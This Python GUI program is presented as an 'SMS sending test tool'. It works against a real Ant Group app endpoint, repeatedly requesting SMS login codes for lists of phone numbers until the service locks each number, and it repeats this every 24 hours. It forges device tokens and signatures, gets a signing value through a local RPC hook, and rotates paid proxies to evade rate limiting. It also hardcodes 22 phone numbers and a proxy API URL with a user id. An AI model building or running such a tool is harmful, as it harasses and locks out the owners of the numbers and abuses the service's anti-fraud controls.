#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
短信发送测试程序
================

基于jt-6-1.py的RPC系统，实现自动化短信发送测试
"""

import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import threading
import time
import json
import requests
import random
import uuid
from datetime import datetime, timedelta
import queue
import os
import sys
from typing import Dict, Any
import hashlib

class SMSSender:
    def __init__(self):
        self.root = tk.Tk()
        self.setup_ui()

        # 数据存储
        self.phone_numbers = []
        self.proxy_list = []
        self.proxy_index = 0
        self.locked_phones = {}  # 存储锁号成功的手机号和时间
        self.running = False
        self.threads = []
        self.auto_extract_running = False
        self.proxy_extract_thread = None

        # 日志队列
        self.log_queue = queue.Queue()

        # RPC配置
        self.rpc_base_url = "http://127.0.0.1:8080"

        # 启动日志处理线程
        self.start_log_thread()

    def setup_ui(self):
        """设置UI界面"""
        self.root.title("短信发送测试工具 v1.0")
        self.root.geometry("1000x700")
        self.root.configure(bg='#f0f0f0')

        # 创建主框架
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))

        # 配置网格权重
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        main_frame.columnconfigure(1, weight=1)

        # 1. 文件选择区域
        file_frame = ttk.LabelFrame(main_frame, text="文件配置", padding="5")
        file_frame.grid(row=0, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(0, 10))

        ttk.Label(file_frame, text="手机号文件:").grid(row=0, column=0, sticky=tk.W)
        self.file_path_var = tk.StringVar()
        ttk.Entry(file_frame, textvariable=self.file_path_var, width=50).grid(row=0, column=1, padx=(5, 5))
        ttk.Button(file_frame, text="选择文件", command=self.select_file).grid(row=0, column=2)

        # 2. 代理配置区域
        proxy_frame = ttk.LabelFrame(main_frame, text="代理配置", padding="5")
        proxy_frame.grid(row=1, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(0, 10))

        ttk.Label(proxy_frame, text="代理API:").grid(row=0, column=0, sticky=tk.W)
        self.proxy_api_var = tk.StringVar()
        # 从Config_Proxy.ini读取代理API
        proxy_api = self.load_proxy_config()
        self.proxy_api_var.set(proxy_api)
        ttk.Entry(proxy_frame, textvariable=self.proxy_api_var, width=60).grid(row=0, column=1, padx=(5, 5))

        # 代理控制按钮
        proxy_btn_frame = ttk.Frame(proxy_frame)
        proxy_btn_frame.grid(row=0, column=2, padx=(5, 0))
        ttk.Button(proxy_btn_frame, text="获取代理", command=self.fetch_proxies).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(proxy_btn_frame, text="自动提取", command=self.auto_extract_proxies).pack(side=tk.LEFT)

        # 代理状态和设置
        self.proxy_status_var = tk.StringVar(value="代理状态: 未获取")
        ttk.Label(proxy_frame, textvariable=self.proxy_status_var).grid(row=1, column=0, columnspan=2, sticky=tk.W, pady=(5, 0))

        # 自动提取设置
        auto_frame = ttk.Frame(proxy_frame)
        auto_frame.grid(row=2, column=0, columnspan=3, sticky=tk.W, pady=(5, 0))

        self.auto_extract_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(auto_frame, text="启用自动提取代理", variable=self.auto_extract_var).pack(side=tk.LEFT)

        ttk.Label(auto_frame, text="提取间隔(秒):").pack(side=tk.LEFT, padx=(20, 5))
        self.extract_interval_var = tk.StringVar(value="300")
        ttk.Entry(auto_frame, textvariable=self.extract_interval_var, width=8).pack(side=tk.LEFT)

        # 3. 线程配置区域
        thread_frame = ttk.LabelFrame(main_frame, text="线程配置", padding="5")
        thread_frame.grid(row=2, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(0, 10))

        ttk.Label(thread_frame, text="并发线程数:").grid(row=0, column=0, sticky=tk.W)
        self.thread_count_var = tk.StringVar(value="10")
        ttk.Entry(thread_frame, textvariable=self.thread_count_var, width=10).grid(row=0, column=1, padx=(5, 0))

        ttk.Label(thread_frame, text="请求间隔(秒):").grid(row=0, column=2, sticky=tk.W, padx=(20, 0))
        self.interval_var = tk.StringVar(value="1")
        ttk.Entry(thread_frame, textvariable=self.interval_var, width=10).grid(row=0, column=3, padx=(5, 0))

        # 4. 控制按钮区域
        control_frame = ttk.Frame(main_frame)
        control_frame.grid(row=3, column=0, columnspan=2, pady=(0, 10))

        self.start_btn = ttk.Button(control_frame, text="开始测试", command=self.start_testing)
        self.start_btn.pack(side=tk.LEFT, padx=(0, 10))

        self.stop_btn = ttk.Button(control_frame, text="停止测试", command=self.stop_testing, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=(0, 10))

        ttk.Button(control_frame, text="清空日志", command=self.clear_log).pack(side=tk.LEFT, padx=(0, 10))
        ttk.Button(control_frame, text="导出结果", command=self.export_results).pack(side=tk.LEFT)

        # 5. 状态显示区域
        status_frame = ttk.LabelFrame(main_frame, text="运行状态", padding="5")
        status_frame.grid(row=4, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(0, 10))

        self.status_var = tk.StringVar(value="就绪")
        ttk.Label(status_frame, textvariable=self.status_var).pack(side=tk.LEFT)

        self.progress_var = tk.StringVar(value="进度: 0/0")
        ttk.Label(status_frame, textvariable=self.progress_var).pack(side=tk.RIGHT)

        # 6. 数据表格区域
        table_frame = ttk.LabelFrame(main_frame, text="测试结果", padding="5")
        table_frame.grid(row=5, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), padx=(0, 5))
        table_frame.columnconfigure(0, weight=1)
        table_frame.rowconfigure(0, weight=1)

        # 创建表格
        columns = ("序号", "手机号", "时间", "运行日志")
        self.tree = ttk.Treeview(table_frame, columns=columns, show="headings", height=15)

        # 设置列标题和宽度
        self.tree.heading("序号", text="序号")
        self.tree.heading("手机号", text="手机号")
        self.tree.heading("时间", text="时间")
        self.tree.heading("运行日志", text="运行日志")

        self.tree.column("序号", width=50, anchor=tk.CENTER)
        self.tree.column("手机号", width=120, anchor=tk.CENTER)
        self.tree.column("时间", width=150, anchor=tk.CENTER)
        self.tree.column("运行日志", width=200, anchor=tk.W)

        # 添加滚动条
        tree_scroll = ttk.Scrollbar(table_frame, orient=tk.VERTICAL, command=self.tree.yview)
        self.tree.configure(yscrollcommand=tree_scroll.set)

        self.tree.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        tree_scroll.grid(row=0, column=1, sticky=(tk.N, tk.S))

        # 7. 日志区域
        log_frame = ttk.LabelFrame(main_frame, text="系统日志", padding="5")
        log_frame.grid(row=5, column=1, sticky=(tk.W, tk.E, tk.N, tk.S), padx=(5, 0))
        log_frame.columnconfigure(0, weight=1)
        log_frame.rowconfigure(0, weight=1)

        self.log_text = scrolledtext.ScrolledText(log_frame, width=40, height=15, wrap=tk.WORD)
        self.log_text.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))

        # 配置主框架的网格权重
        main_frame.rowconfigure(5, weight=1)

    def log(self, message: str, level: str = "INFO"):
        """添加日志消息到队列"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] [{level}] {message}"
        self.log_queue.put(log_entry)

    def start_log_thread(self):
        """启动日志处理线程"""
        def process_logs():
            while True:
                try:
                    log_entry = self.log_queue.get(timeout=0.1)
                    self.root.after(0, lambda: self.update_log_display(log_entry))
                except queue.Empty:
                    continue

        log_thread = threading.Thread(target=process_logs, daemon=True)
        log_thread.start()

    def update_log_display(self, log_entry: str):
        """更新日志显示"""
        self.log_text.insert(tk.END, log_entry + "\n")
        self.log_text.see(tk.END)

        # 限制日志行数
        lines = self.log_text.get("1.0", tk.END).split("\n")
        if len(lines) > 1000:
            self.log_text.delete("1.0", f"{len(lines)-500}.0")

    def select_file(self):
        """选择手机号文件"""
        file_path = filedialog.askopenfilename(
            title="选择手机号文件",
            filetypes=[("文本文件", "*.txt"), ("所有文件", "*.*")]
        )
        if file_path:
            self.file_path_var.set(file_path)
            self.load_phone_numbers(file_path)

    def load_phone_numbers(self, file_path: str):
        """加载手机号"""
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                lines = f.readlines()

            self.phone_numbers = []
            for line in lines:
                phone = line.strip()
                if phone and phone.isdigit() and len(phone) == 11:
                    self.phone_numbers.append(phone)

            self.log(f"成功加载 {len(self.phone_numbers)} 个手机号")
            self.update_table_display()

        except Exception as e:
            self.log(f"加载手机号文件失败: {e}", "ERROR")
            messagebox.showerror("错误", f"加载文件失败: {e}")

    def update_table_display(self):
        """更新表格显示"""
        # 清空现有数据
        for item in self.tree.get_children():
            self.tree.delete(item)

        # 添加手机号数据
        for i, phone in enumerate(self.phone_numbers, 1):
            status = "等待中"
            if phone in self.locked_phones:
                status = f"锁号成功 ({self.locked_phones[phone]})"

            self.tree.insert("", tk.END, values=(i, phone, "", status))

    def fetch_proxies(self):
        """获取代理列表"""
        try:
            proxy_api = self.proxy_api_var.get().strip()
            if not proxy_api:
                messagebox.showwarning("警告", "请输入代理API地址")
                return

            self.log("正在获取代理列表...")
            response = requests.get(proxy_api, timeout=10)
            response.raise_for_status()

            # 解析代理列表
            proxy_text = response.text.strip()
            new_proxies = []

            for line in proxy_text.split('\n'):
                line = line.strip()
                if line and ':' in line:
                    # 验证代理格式
                    try:
                        ip, port = line.split(':')
                        if ip and port.isdigit():
                            new_proxies.append(line)
                    except:
                        continue

            if new_proxies:
                self.proxy_list = new_proxies
                self.proxy_index = 0  # 重置索引
                self.proxy_status_var.set(f"代理状态: 已获取 {len(self.proxy_list)} 个代理")
                self.log(f"成功获取 {len(self.proxy_list)} 个代理")
                return True
            else:
                self.proxy_status_var.set("代理状态: 获取失败")
                self.log("代理列表为空", "ERROR")
                return False

        except Exception as e:
            self.proxy_status_var.set("代理状态: 获取失败")
            self.log(f"获取代理失败: {e}", "ERROR")
            return False

    def auto_extract_proxies(self):
        """自动提取代理"""
        if self.auto_extract_running:
            # 停止自动提取
            self.auto_extract_running = False
            self.log("停止自动提取代理")
            return

        # 开始自动提取
        self.auto_extract_running = True
        self.log("开始自动提取代理")

        def extract_worker():
            while self.auto_extract_running:
                try:
                    # 获取代理
                    success = self.fetch_proxies()

                    if success:
                        # 清理无效代理
                        self.clean_invalid_proxies()

                    # 等待指定间隔
                    interval = int(self.extract_interval_var.get())
                    for _ in range(interval):
                        if not self.auto_extract_running:
                            break
                        time.sleep(1)

                except Exception as e:
                    self.log(f"自动提取代理异常: {e}", "ERROR")
                    time.sleep(30)  # 异常时等待30秒

        self.proxy_extract_thread = threading.Thread(target=extract_worker, daemon=True)
        self.proxy_extract_thread.start()

    def clean_invalid_proxies(self):
        """清理无效代理"""
        if not self.proxy_list:
            return

        valid_proxies = []
        test_count = min(5, len(self.proxy_list))  # 测试前5个代理

        for i in range(test_count):
            proxy = self.proxy_list[i]
            if self.test_proxy(proxy):
                valid_proxies.append(proxy)

        # 如果有效代理太少，保留原列表
        if len(valid_proxies) < 2:
            self.log(f"有效代理太少({len(valid_proxies)})，保留原列表")
        else:
            # 将有效代理放在前面，其他代理放在后面
            remaining_proxies = self.proxy_list[test_count:]
            self.proxy_list = valid_proxies + remaining_proxies
            self.log(f"代理清理完成，有效代理: {len(valid_proxies)}")

    def test_proxy(self, proxy: str) -> bool:
        """测试代理是否有效"""
        try:
            proxies = {
                "http": f"http://{proxy}",
                "https": f"http://{proxy}"
            }

            # 使用简单的HTTP请求测试代理
            response = requests.get(
                "http://httpbin.org/ip",
                proxies=proxies,
                timeout=5
            )
            return response.status_code == 200

        except:
            return False

    def get_next_proxy(self) -> str:
        """获取下一个代理"""
        if not self.proxy_list:
            # 如果没有代理且启用了自动提取，尝试获取
            if self.auto_extract_var.get() and not self.auto_extract_running:
                self.log("代理列表为空，尝试自动获取...")
                self.fetch_proxies()
            return None

        # 获取当前代理
        proxy = self.proxy_list[self.proxy_index % len(self.proxy_list)]
        self.proxy_index += 1

        # 如果代理用完了一轮，触发自动提取
        if self.proxy_index % len(self.proxy_list) == 0 and self.auto_extract_var.get():
            self.log("代理轮换完成，触发自动提取...")
            threading.Thread(target=self.fetch_proxies, daemon=True).start()

        return proxy

    def get_rpc_qm(self, data: str) -> str:
        """调用RPC获取qm参数 - 按照易语言逻辑"""
        try:
            # 只使用8080端口，按照易语言逻辑
            rpc_url = "http://127.0.0.1:8080/get"
            params = {"data": data}
            response = requests.get(rpc_url, params=params, timeout=10)

            if response.status_code == 200:
                response_text = response.text
                # 按照易语言逻辑：工具_取文本中间_A (qm, "item_retval")
                import re
                match = re.search(r'"item_retval"\s*:\s*"([^"]*)"', response_text)
                if match:
                    qm = match.group(1)
                    self.log(f"获取qm参数成功: {qm[:20]}...")
                    return qm
                else:
                    self.log("未找到item_retval字段", "ERROR")
                    return ""
            else:
                self.log(f"RPC调用失败: HTTP {response.status_code}", "ERROR")
                return ""

        except Exception as e:
            self.log(f"RPC调用异常: {e}", "ERROR")
            return ""



    def generate_device_params(self) -> Dict[str, Any]:
        """生成设备参数 - 按照易语言格式"""
        timestamp = int(time.time() * 1000)
        device_id = str(uuid.uuid4())

        # 生成随机数字字符串
        def random_digits(length):
            return ''.join([str(random.randint(0, 9)) for _ in range(length)])

        return {
            "timestamp": timestamp,
            "device_id": device_id,
            "random_5": random_digits(5),
            "random_4": random_digits(4),
            "random_3": random_digits(3)
        }

    def generate_sign(self, params: Dict[str, Any]) -> str:
        """生成签名 (简化版本)"""
        # 这里应该根据实际的签名算法来实现
        # 目前使用简化的MD5签名
        sign_data = f"{params['timestamp']}{params['device_id']}{params.get('phone', '')}"
        return hashlib.md5(sign_data.encode()).hexdigest()

    def send_sms_request(self, phone: str, proxy: str = None, retry_count: int = 3) -> Dict[str, Any]:
        """发送短信请求 - 按照易语言成功逻辑"""
        last_error = None

        for attempt in range(retry_count):
            try:
                # 生成参数 - 按照易语言格式
                device_params = self.generate_device_params()
                timestamp = str(device_params['timestamp'])
                uuid_val = str(uuid.uuid4())
                did = f"TEMP-aCH3p4Iqpv0DAPeOErH{device_params['random_5']}"
                token_a = f"F6AUPS8llZHQp+g1fDszSTW55Z8G1akeLt9sZu7viIlkRLDElg{device_params['random_4']}=="
                color = f"AQAA_knzZitdh4roJC1h2IcPiHQkTSx2H5Ef9knLrJkjX7aZmcFEeJMzFx1Yy6pHXZvNZps8eBHfwu8ND{device_params['random_4']}0HtTBg=="
                uuid1 = str(uuid.uuid4())
                hx = f"{timestamp},{uuid1},178"
                token = f"F6AUPS8llZHQp+g1fDszSTW55Z8G1akeLt9sZu7viIlkRL{device_params['random_4']}EAAA=="
                ts = f"PR89{device_params['random_3']}"
                jt_mix_ts = str(device_params['timestamp'])

                # 构建sha256数据 - 按照易语言格式
                sha256_str = f'{{"bizType":"login","fansId":"","jtMixAuthCode":"","jtMixTs":"{jt_mix_ts}","jtMixUnique":"{uuid_val}","phoneNumber":"{phone}"}}{hx}'
                sha256_hash = hashlib.sha256(sha256_str.encode()).hexdigest()

                # 获取qm参数
                qm = self.get_rpc_qm(sha256_hash)
                if not qm:
                    return {"success": False, "error": "获取qm参数失败"}

                self.log(f"获取到qm参数: {qm[:20]}...")

                # 构建请求数据 - 按照易语言格式
                request_data = f'[{{"bizType":"login","fansId":"","jtMixAuthCode":"","jtMixTs":"{jt_mix_ts}","jtMixUnique":"{uuid_val}","phoneNumber":"{phone}"}}]'

                # 构建请求头 - 按照易语言顺序
                headers = {
                    "Accept-Language": "zh-Hans",
                    "AppId": "ALIPUB059F038311550",
                    "Connection": "Keep-Alive",
                    "Content-Type": "application/json",
                    "Did": did,
                    "Host": "mgs-normal.antfans.com",
                    "Operation-Type": "com.antgroup.antchain.mymobileprod.service.user.requestSmsCodeWithoutLogin",
                    "Platform": "ANDROID",
                    "Retryable2": "0",
                    "RpcId": "46",
                    "TRACEID": f"{did}{ts}_46",
                    "Ts": ts,
                    "User-Agent": "Android_Ant_Client",
                    "Version": "2",
                    "WorkspaceId": "prod",
                    "hx": hx,
                    "productId": "ALIPUB059F038311550_ANDROID",
                    "productVersion": "1.8.5.241219194812",
                    "qm": qm,
                    "signType": "0",
                    "x-68687967-version": "25.5.1.1",
                    "x-app-sys-Id": "com.antfans.fans",
                    "x-device-ap-token": token_a,
                    "x-device-color": color,
                    "x-device-model": "SM-G9730",
                    "x-device-timestamp": timestamp,
                    "x-device-token": token,
                    "x-device-utdid": did.replace("TEMP-", ""),
                    "x-fans-utdid": "009&51bfbf30oYzlHRVqQfMeKOoHhYe1bQ==",
                    "x-fans-version": "2.40.0",
                    "x-platform": "Android",
                    "x-source": "fans"
                }

                # 设置代理
                proxies = None
                if proxy:
                    proxies = {
                        "http": f"http://{proxy}",
                        "https": f"http://{proxy}"
                    }

                # 发送请求
                url = "https://mgs-normal.antfans.com/mgw.htm"
                self.log(f"发送短信请求到: {phone}")

                response = requests.post(
                    url,
                    data=request_data,  # 使用data而不是json
                    headers=headers,
                    proxies=proxies,
                    timeout=30
                )

                self.log(f"响应状态码: {response.status_code}")

                # 检查响应
                if response.status_code == 200:
                    try:
                        result = response.json()
                        self.log(f"响应内容: {result}")
                        return {
                            "success": True,
                            "response": result,
                            "status_code": response.status_code,
                            "proxy": proxy,
                            "attempt": attempt + 1
                        }
                    except:
                        return {
                            "success": True,
                            "response": response.text,
                            "status_code": response.status_code,
                            "proxy": proxy,
                            "attempt": attempt + 1
                        }
                else:
                    self.log(f"请求失败: HTTP {response.status_code}")

            except Exception as e:
                last_error = str(e)
                self.log(f"请求异常: {e}", "ERROR")

                # 如果是代理相关错误，尝试获取新代理
                if proxy and ("ProxyError" in str(e) or "ConnectTimeout" in str(e) or "Connection" in str(e)):
                    self.log(f"代理 {proxy} 失效，尝试获取新代理...")
                    new_proxy = self.get_next_proxy()
                    if new_proxy and new_proxy != proxy:
                        proxy = new_proxy
                        continue

                # 如果不是最后一次尝试，等待后重试
                if attempt < retry_count - 1:
                    time.sleep(1)

        return {
            "success": False,
            "error": last_error or "未知错误",
            "proxy": proxy,
            "attempts": retry_count
        }

    def is_locked(self, response_data: Dict[str, Any]) -> bool:
        """判断是否锁号成功"""
        if not response_data.get("success"):
            return False

        response = response_data.get("response", {})
        biz_status_code = response.get("bizStatusCode")
        biz_status_message = response.get("bizStatusMessage", "")

        # 根据抓包信息，锁号成功的标志是 bizStatusCode: 10703
        if biz_status_code == 10703:
            return True

        # 也可以根据消息内容判断
        if "操作存在异常" in biz_status_message or "请稍后再试" in biz_status_message:
            return True

        return False

    def process_phone_worker(self, phone: str, thread_id: int):
        """处理单个手机号的工作线程"""
        try:
            interval = float(self.interval_var.get())
            request_count = 0

            while self.running and phone not in self.locked_phones:
                request_count += 1

                # 获取代理
                proxy = self.get_next_proxy()

                # 发送请求
                self.log(f"[线程{thread_id}] {phone} 第{request_count}次请求 (代理: {proxy or '无'})")
                result = self.send_sms_request(phone, proxy)

                # 更新表格状态
                current_time = datetime.now().strftime("%H:%M:%S")
                status = "请求中..."

                if result["success"]:
                    response = result["response"]
                    biz_code = response.get("bizStatusCode")
                    biz_msg = response.get("bizStatusMessage", "")

                    if self.is_locked(result):
                        # 锁号成功
                        lock_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        self.locked_phones[phone] = lock_time
                        status = f"锁号成功 ({lock_time})"
                        self.log(f"[线程{thread_id}] {phone} 锁号成功！", "SUCCESS")

                        # 更新表格
                        self.root.after(0, lambda: self.update_phone_status(phone, current_time, status))
                        break
                    else:
                        status = f"继续请求 (状态码: {biz_code})"
                        self.log(f"[线程{thread_id}] {phone} 响应: {biz_code} - {biz_msg}")
                else:
                    status = f"请求失败: {result['error'][:20]}..."
                    self.log(f"[线程{thread_id}] {phone} 请求失败: {result['error']}", "ERROR")

                # 更新表格状态
                self.root.after(0, lambda: self.update_phone_status(phone, current_time, status))

                # 等待间隔
                if self.running and phone not in self.locked_phones:
                    time.sleep(interval)

        except Exception as e:
            self.log(f"[线程{thread_id}] {phone} 处理异常: {e}", "ERROR")

    def update_phone_status(self, phone: str, time_str: str, status: str):
        """更新手机号状态"""
        for item in self.tree.get_children():
            values = self.tree.item(item, "values")
            if values[1] == phone:  # 手机号匹配
                self.tree.item(item, values=(values[0], phone, time_str, status))
                break

    def start_testing(self):
        """开始测试"""
        try:
            if not self.phone_numbers:
                messagebox.showwarning("警告", "请先加载手机号文件")
                return

            # 如果没有代理但启用了自动提取，先尝试获取
            if not self.proxy_list:
                if self.auto_extract_var.get():
                    self.log("代理列表为空，尝试自动获取代理...")
                    success = self.fetch_proxies()
                    if not success:
                        messagebox.showwarning("警告", "无法获取代理，请检查代理API或手动获取代理")
                        return
                else:
                    messagebox.showwarning("警告", "请先获取代理列表或启用自动提取")
                    return

            thread_count = int(self.thread_count_var.get())
            if thread_count <= 0:
                messagebox.showwarning("警告", "线程数必须大于0")
                return

            self.running = True
            self.start_btn.config(state=tk.DISABLED)
            self.stop_btn.config(state=tk.NORMAL)

            self.log(f"开始测试，共 {len(self.phone_numbers)} 个手机号，{thread_count} 个线程")
            self.status_var.set("运行中...")

            # 启动工作线程
            self.threads = []
            phone_queue = queue.Queue()

            # 将手机号放入队列
            for phone in self.phone_numbers:
                if phone not in self.locked_phones:
                    phone_queue.put(phone)

            # 启动线程
            for i in range(min(thread_count, phone_queue.qsize())):
                thread = threading.Thread(
                    target=self.worker_thread,
                    args=(phone_queue, i + 1),
                    daemon=True
                )
                thread.start()
                self.threads.append(thread)

            # 启动监控线程
            monitor_thread = threading.Thread(target=self.monitor_progress, daemon=True)
            monitor_thread.start()

            # 启动24小时重试检查线程
            retry_thread = threading.Thread(target=self.check_retry_schedule, daemon=True)
            retry_thread.start()

        except ValueError:
            messagebox.showerror("错误", "线程数必须是有效数字")
        except Exception as e:
            self.log(f"启动测试失败: {e}", "ERROR")
            messagebox.showerror("错误", f"启动失败: {e}")

    def worker_thread(self, phone_queue: queue.Queue, thread_id: int):
        """工作线程"""
        while self.running:
            try:
                phone = phone_queue.get_nowait()
                self.process_phone_worker(phone, thread_id)
            except queue.Empty:
                break
            except Exception as e:
                self.log(f"工作线程{thread_id}异常: {e}", "ERROR")

    def monitor_progress(self):
        """监控进度"""
        while self.running:
            try:
                total = len(self.phone_numbers)
                locked = len(self.locked_phones)
                self.root.after(0, lambda: self.progress_var.set(f"进度: {locked}/{total}"))

                if locked == total:
                    self.root.after(0, lambda: self.status_var.set("全部完成"))
                    self.log("所有手机号处理完成！", "SUCCESS")
                    break

                time.sleep(1)
            except Exception as e:
                self.log(f"监控线程异常: {e}", "ERROR")
                break

    def check_retry_schedule(self):
        """检查24小时重试计划"""
        while self.running:
            try:
                current_time = datetime.now()
                retry_phones = []

                for phone, lock_time_str in self.locked_phones.items():
                    lock_time = datetime.strptime(lock_time_str, "%Y-%m-%d %H:%M:%S")
                    if current_time - lock_time >= timedelta(hours=24):
                        retry_phones.append(phone)

                if retry_phones:
                    self.log(f"检测到 {len(retry_phones)} 个手机号需要重新测试")
                    for phone in retry_phones:
                        del self.locked_phones[phone]

                    # 重新启动这些手机号的测试
                    self.root.after(0, self.update_table_display)

                time.sleep(3600)  # 每小时检查一次
            except Exception as e:
                self.log(f"重试检查线程异常: {e}", "ERROR")
                break

    def stop_testing(self):
        """停止测试"""
        self.running = False
        self.auto_extract_running = False  # 停止自动提取
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.status_var.set("已停止")
        self.log("测试已停止")

    def clear_log(self):
        """清空日志"""
        self.log_text.delete("1.0", tk.END)
        self.log("日志已清空")

    def export_results(self):
        """导出结果"""
        try:
            file_path = filedialog.asksaveasfilename(
                title="保存结果",
                defaultextension=".txt",
                filetypes=[("文本文件", "*.txt"), ("所有文件", "*.*")]
            )

            if file_path:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write("短信发送测试结果\n")
                    f.write("=" * 50 + "\n")
                    f.write(f"导出时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"总手机号数: {len(self.phone_numbers)}\n")
                    f.write(f"锁号成功数: {len(self.locked_phones)}\n\n")

                    f.write("锁号成功列表:\n")
                    f.write("-" * 30 + "\n")
                    for phone, lock_time in self.locked_phones.items():
                        f.write(f"{phone} - {lock_time}\n")

                    f.write("\n所有手机号状态:\n")
                    f.write("-" * 30 + "\n")
                    for item in self.tree.get_children():
                        values = self.tree.item(item, "values")
                        f.write(f"{values[0]}. {values[1]} - {values[3]}\n")

                self.log(f"结果已导出到: {file_path}")
                messagebox.showinfo("成功", f"结果已导出到:\n{file_path}")

        except Exception as e:
            self.log(f"导出失败: {e}", "ERROR")
            messagebox.showerror("错误", f"导出失败: {e}")

    def load_locked_phones_from_file(self):
        """从文件加载已锁号的手机号"""
        try:
            if os.path.exists("locked_phones.json"):
                with open("locked_phones.json", 'r', encoding='utf-8') as f:
                    self.locked_phones = json.load(f)
                self.log(f"加载了 {len(self.locked_phones)} 个已锁号手机号")
        except Exception as e:
            self.log(f"加载锁号记录失败: {e}", "ERROR")

    def save_locked_phones_to_file(self):
        """保存已锁号的手机号到文件"""
        try:
            with open("locked_phones.json", 'w', encoding='utf-8') as f:
                json.dump(self.locked_phones, f, ensure_ascii=False, indent=2)
        except Exception as e:
            self.log(f"保存锁号记录失败: {e}", "ERROR")

    def on_closing(self):
        """程序关闭时的处理"""
        self.running = False
        self.auto_extract_running = False
        self.save_locked_phones_to_file()
        self.log("程序正在关闭...")
        self.root.destroy()

    def run(self):
        """运行程序"""
        # 加载已锁号记录
        self.load_locked_phones_from_file()

        # 设置关闭事件
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

        # 启动GUI
        self.root.mainloop()

    def load_proxy_config(self) -> str:
        """从Config_Proxy.ini加载代理配置"""
        try:
            if os.path.exists("Config_Proxy.ini"):
                with open("Config_Proxy.ini", 'r', encoding='gbk') as f:
                    content = f.read()

                # 查找提取地址1
                import re
                match = re.search(r'提取地址1=(.+)', content)
                if match:
                    proxy_api = match.group(1).strip()
                    if proxy_api and proxy_api != "空":
                        self.log(f"从Config_Proxy.ini加载代理API: {proxy_api[:50]}...")
                        return proxy_api

            # 默认代理API
            return "http://bapi.51daili.com/unlimitedold/getapi2?linePoolIndex=1&packid=4&time=1&qty=50&port=1&format=txt&usertype=17&uid=58553"

        except Exception as e:
            self.log(f"加载代理配置失败: {e}", "ERROR")
            return "http://bapi.51daili.com/unlimitedold/getapi2?linePoolIndex=1&packid=4&time=1&qty=50&port=1&format=txt&usertype=17&uid=58553"


def create_test_phone_file():
    """创建测试用的手机号文件"""
    test_phones = [
        "19283424723", "19306036069", "17384781297", "15030604625", "17354062902",
        "16115009603", "19293432365", "19293454350", "17382330019", "19293454426",
        "19293404109", "17183954554", "19283425038", "19222614595", "19040674620",
        "19293404507", "17068445904", "19293454310", "19253531634", "17176310769",
        "13112039645", "19222615478"
    ]

    with open("test_phones.txt", 'w', encoding='utf-8') as f:
        for phone in test_phones:
            f.write(phone + "\n")

    print("测试手机号文件已创建: test_phones.txt")


def main():
    """主程序入口"""
    # 检查是否需要创建测试文件
    if len(sys.argv) > 1 and sys.argv[1] == "--create-test":
        create_test_phone_file()
        return

    # 启动GUI程序
    try:
        app = SMSSender()
        app.run()
    except Exception as e:
        print(f"程序启动失败: {e}")
        input("按回车键退出...")


if __name__ == "__main__":
    main()
